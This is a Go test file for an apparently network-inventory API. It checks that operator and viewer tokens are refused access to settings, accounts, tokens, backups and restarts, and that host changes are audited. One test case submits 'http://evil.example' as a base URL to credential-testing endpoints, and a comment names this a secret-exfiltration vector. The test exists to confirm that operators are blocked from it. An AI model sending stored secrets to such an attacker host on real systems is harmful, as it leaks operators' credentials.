package api

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"testing"

	"github.com/tessera/tessera/internal/account"
	"github.com/tessera/tessera/internal/config"
	"github.com/tessera/tessera/internal/reconcile"
	"github.com/tessera/tessera/internal/secret"
	"github.com/tessera/tessera/internal/settings"
	"github.com/tessera/tessera/internal/store/sqlite"
)

// TestRoleBoundaries pins the three-role contract: an operator curates inventory
// but can never reach credentials/accounts/instance controls, and a viewer can
// only read. The line matters because Settings holds the UniFi/Proxmox/DNS
// secrets (and its test endpoints will send a stored secret to a supplied URL).
func TestRoleBoundaries(t *testing.T) {
	ctx := context.Background()
	st, err := sqlite.Open(filepath.Join(t.TempDir(), "rbac.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	if err := st.Migrate(ctx); err != nil {
		t.Fatal(err)
	}
	cipher, _ := secret.New(secret.GenerateKey())
	recon := reconcile.New(st, nil, reconcile.Params{})
	srv := New(Options{
		ListenAddr: "127.0.0.1:0", Token: testToken, Accounts: account.NewManager(st),
		Settings: settings.New(st, cipher), EffectiveConfig: config.Default(), Store: st,
		Reconcile: func(ctx context.Context) error { _, e := recon.Rebuild(ctx); return e },
	})
	ts := httptest.NewServer(srv.routes())
	t.Cleanup(ts.Close)

	// Mint one token per role (the static env token is the admin).
	mint := func(role string) string {
		r := authPost(t, ts.URL+"/api/tokens", map[string]any{"name": "t-" + role, "role": role})
		if r.StatusCode != 200 {
			t.Fatalf("create %s token → %d", role, r.StatusCode)
		}
		var out struct {
			Token string `json:"token"`
		}
		json.NewDecoder(r.Body).Decode(&out)
		r.Body.Close()
		if out.Token == "" {
			t.Fatalf("no %s token returned", role)
		}
		return out.Token
	}
	operator, viewer := mint("operator"), mint("viewer")

	do := func(tok, method, path string, body any) int {
		var rdr *bytes.Reader
		if body != nil {
			b, _ := json.Marshal(body)
			rdr = bytes.NewReader(b)
		} else {
			rdr = bytes.NewReader(nil)
		}
		req, _ := http.NewRequest(method, ts.URL+path, rdr)
		req.Header.Set("Authorization", "Bearer "+tok)
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		return resp.StatusCode
	}
	forbidden := func(code int) bool { return code == http.StatusForbidden }

	// ── operator CAN curate ───────────────────────────────────────────────────
	if code := do(operator, "POST", "/api/host/create", map[string]any{"mac": "aa:bb:cc:00:00:01", "display_name": "op-made"}); code != 200 {
		t.Errorf("operator create host → %d, want 200", code)
	}
	if code := do(operator, "POST", "/api/host/annotate", map[string]any{"stable_id": "mac:aa:bb:cc:00:00:01", "display_name": "renamed"}); code != 200 {
		t.Errorf("operator annotate → %d, want 200", code)
	}
	if code := do(operator, "POST", "/api/hosts/bulk", map[string]any{"stable_ids": []string{"mac:aa:bb:cc:00:00:01"}, "action": "expected"}); code != 200 {
		t.Errorf("operator bulk expected → %d, want 200", code)
	}
	if code := do(operator, "POST", "/api/host/forget", map[string]any{"stable_id": "mac:aa:bb:cc:00:00:01"}); code != 200 {
		t.Errorf("operator forget ONE device → %d, want 200", code)
	}

	// ── operator CANNOT reach credentials, accounts, or the instance ──────────
	for _, c := range []struct {
		method, path string
		body         any
	}{
		{"GET", "/api/settings", nil},
		{"PUT", "/api/settings", map[string]any{"editable": map[string]any{}}},
		{"POST", "/api/test/proxmox", map[string]any{"base_url": "http://evil.example"}}, // secret-exfil vector
		{"POST", "/api/test/unifi", map[string]any{"base_url": "http://evil.example"}},
		{"GET", "/api/users", nil},
		{"POST", "/api/users", map[string]any{"username": "x", "password": "abcdefgh", "role": "admin"}},
		{"GET", "/api/tokens", nil},
		{"POST", "/api/tokens", map[string]any{"name": "x", "role": "admin"}},
		{"GET", "/api/audit", nil},
		{"GET", "/api/system", nil},
		{"GET", "/api/backup", nil},
		{"POST", "/api/restart", nil},
	} {
		if code := do(operator, c.method, c.path, c.body); !forbidden(code) {
			t.Errorf("operator %s %s → %d, want 403", c.method, c.path, code)
		}
	}

	// Bulk FORGET specifically stays admin-only, even though single forget doesn't.
	if code := do(operator, "POST", "/api/hosts/bulk", map[string]any{"stable_ids": []string{"mac:aa:bb:cc:00:00:09"}, "action": "forget"}); !forbidden(code) {
		t.Errorf("operator bulk FORGET → %d, want 403", code)
	}
	// …and an admin can still do it.
	if code := do(testToken, "POST", "/api/hosts/bulk", map[string]any{"stable_ids": []string{"mac:aa:bb:cc:00:00:09"}, "action": "forget"}); code != 200 {
		t.Errorf("admin bulk forget → %d, want 200", code)
	}

	// ── viewer reads, never writes ────────────────────────────────────────────
	if code := do(viewer, "GET", "/api/v1/hosts", nil); code != 200 {
		t.Errorf("viewer read hosts → %d, want 200", code)
	}
	for _, c := range []struct {
		method, path string
		body         any
	}{
		{"POST", "/api/host/annotate", map[string]any{"stable_id": "mac:aa:bb:cc:00:00:01"}},
		{"POST", "/api/host/create", map[string]any{"mac": "aa:bb:cc:00:00:02"}},
		{"POST", "/api/host/forget", map[string]any{"stable_id": "mac:aa:bb:cc:00:00:01"}},
		{"POST", "/api/conflict/resolve", map[string]any{"subject": "x", "attribute": "hostname"}},
		{"GET", "/api/settings", nil},
	} {
		if code := do(viewer, c.method, c.path, c.body); !forbidden(code) {
			t.Errorf("viewer %s %s → %d, want 403", c.method, c.path, code)
		}
	}
}

// TestCurationWritesAreAudited: with more than one role able to mutate the
// inventory, every change must be attributable.
func TestCurationWritesAreAudited(t *testing.T) {
	ctx := context.Background()
	st, err := sqlite.Open(filepath.Join(t.TempDir(), "audit.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	if err := st.Migrate(ctx); err != nil {
		t.Fatal(err)
	}
	cipher, _ := secret.New(secret.GenerateKey())
	recon := reconcile.New(st, nil, reconcile.Params{})
	srv := New(Options{
		ListenAddr: "127.0.0.1:0", Token: testToken, Accounts: account.NewManager(st),
		Settings: settings.New(st, cipher), EffectiveConfig: config.Default(), Store: st,
		Reconcile: func(ctx context.Context) error { _, e := recon.Rebuild(ctx); return e },
	})
	ts := httptest.NewServer(srv.routes())
	t.Cleanup(ts.Close)

	if r := authPost(t, ts.URL+"/api/host/create", map[string]any{"mac": "aa:bb:cc:00:00:07", "display_name": "audited"}); r.StatusCode != 200 {
		t.Fatalf("create → %d", r.StatusCode)
	} else {
		r.Body.Close()
	}
	if r := authPost(t, ts.URL+"/api/host/forget", map[string]any{"stable_id": "mac:aa:bb:cc:00:00:07"}); r.StatusCode != 200 {
		t.Fatalf("forget → %d", r.StatusCode)
	} else {
		r.Body.Close()
	}

	entries, err := account.NewManager(st).ListAudit(ctx, 50)
	if err != nil {
		t.Fatal(err)
	}
	seen := map[string]bool{}
	for _, e := range entries {
		seen[e.Action] = true
	}
	for _, want := range []string{"host.create", "host.forget"} {
		if !seen[want] {
			t.Errorf("no audit entry for %q; got %v", want, seen)
		}
	}
}
